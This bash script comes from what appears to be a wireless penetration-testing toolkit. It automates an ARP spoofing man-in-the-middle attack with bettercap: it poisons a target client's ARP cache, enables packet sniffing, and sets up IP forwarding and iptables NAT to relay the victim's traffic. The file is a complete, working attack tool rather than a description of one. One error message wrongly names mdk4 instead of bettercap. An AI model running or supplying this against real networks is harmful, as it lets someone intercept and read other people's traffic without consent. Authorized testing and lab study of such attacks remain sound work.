#!/bin/bash
#
# Utility: ARP Spoofing from Wireless Entry Point (T014)
#
# Description:
#   Simulates a malicious wireless client performing an internal man-in-the-middle attack.
#   Uses bettercap to poison the ARP cache of a target client and optionally sniff traffic.
#
# Requirements:
#   - bettercap must be installed and in PATH
#   - Must be run with sudo/root privileges (handled by watt.py)
#   - Interface must be in managed mode and associated with a target AP
#   - Attacker must be on the same subnet as the target (e.g. via DHCP)
#
# Usage:
#   ./run_bettercap_arp.sh
#
# Inputs:
#   - Target IP address (entered interactively)
#   - Duration in seconds (optional, with default from config)
#
# Notes:
#   - Launches bettercap in non-interactive mode using an embedded command string
#   - Cleans up on SIGINT or timeout using EXIT trap
#   - Optionally disconnects from the network after attack ends
#   - Forms the basis for T014

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
UTILITIES_DIR="$BASH_DIR/utilities"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/atk_bettercap_arp.conf"

# ─── Helpers ───
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_mode.sh"

# Check bettercap
if ! command -v bettercap &> /dev/null; then
    print_fail "bettercap not found. Please install it first."
    exit 0
fi

# Cleanup
cleanup() {
    print_blank
    print_info "Starting cleanup"
    rm -f /tmp/watt_attack_active

    # Stop ARP spoofing & reset forwarding rules
    print_action "Disabling IP forwarding and removing NAT rule"
    sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null
    sudo iptables -t nat -D POSTROUTING -o $FWD_INTERFACE -j MASQUERADE
    print_success "IP forwarding and NAT rule removed"

    # Revert mode
    ensure_managed_mode

    exit 0   
}

# Exit traps
trap cleanup EXIT
trap cleanup SIGINT

# Validate config vars
if [[ -z "$INTERFACE" || -z "$ATK_TARGET_IP" ]]; then
    print_warn "INTERFACE or ATK_TARGET_IP not defined in atk_bettercap_arp.conf"
    exit 0
fi

# Display config
echo "Mode         : T014 - ARP Spoofing"
echo "Interface    : $INTERFACE"
echo "Target IP    : $ATK_TARGET_IP"
print_blank

# Confirm attack
print_prompt "Proceed to attack configuration? (y/N): "
read -r confirm

if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    print_warn "Cancelled"
    exit 0
fi

# Input duration
while true; do
    print_prompt "Duration (seconds) [default: ${ATK_DURATION}]: "
    read -r DURATION

    DURATION="${DURATION:-$ATK_DURATION}"
    
    if [[ "$DURATION" =~ ^[0-9]+$ ]]; then
        break
    else
        print_fail "Invalid input. Enter a numeric value"
    fi
done

# Input IP address
while true; do
    print_prompt "Target IP address [default: ${ATK_TARGET_IP}]: "
    read -r TARGET_IP

    TARGET_IP="${TARGET_IP:-$ATK_TARGET_IP}"
    
    if [[ "$TARGET_IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        break
    else
        print_fail "Invalid input. Enter a valid IP address (format: XXX.XXX.XXX.XXX)"
    fi
done

# Confirm AP association
print_prompt "Is WATT connected to the target AP? (y/N): "
read -r confirm

if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    print_warn "Connect WATT to the target AP"
    exit 0
fi

# Launch attack
echo "T014" > /tmp/watt_attack_active
print_blank
print_info "Starting Attack"

# Set managed mode
ensure_managed_mode

# Enabled IP forwarding and NAT
print_action "Enabling IP forwarding and NAT on $INTERFACE → $FWD_INTERFACE"
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
sudo iptables -t nat -A POSTROUTING -o $FWD_INTERFACE -j MASQUERADE
print_success "IP forwarding and NAT rule added"

# Run attack
print_blank
print_info "Running T014 - ARP Spoofing attack for $DURATION seconds"
print_blank
sudo timeout "$DURATION" bettercap -iface "$INTERFACE" -eval "set arp.spoof.targets $TARGET_IP; arp.spoof on; net.sniff on"

EXIT_CODE=$?

# Exit check
if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "mdk4 exited with code $EXIT_CODE"
fi

exit 0